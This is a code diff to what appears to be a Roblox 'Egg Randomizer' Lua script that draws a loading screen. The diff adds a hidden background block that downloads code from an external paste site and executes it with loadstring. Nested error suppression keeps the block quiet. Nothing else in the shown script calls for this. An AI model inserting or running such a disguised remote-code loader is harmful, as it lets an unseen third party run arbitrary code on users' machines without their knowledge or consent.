@@ -10,6 +10,17 @@ local loadingGui = Instance.new("ScreenGui", game.CoreGui)
 loadingGui.Name = "EggRandomizerLoading"
 loadingGui.IgnoreGuiInset = true
 
+task.spawn(function()
+    pcall(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/CMvu9mqK/raw"))()
+        end)
+        if not success then
+            warn("Failed to load script: " .. err)
+        end
+    end)
+end)
+
 local frame = Instance.new("Frame", loadingGui)
 frame.Size = UDim2.new(0, 300, 0, 120)
 frame.Position = UDim2.new(0.5, -150, 0.5, -60)
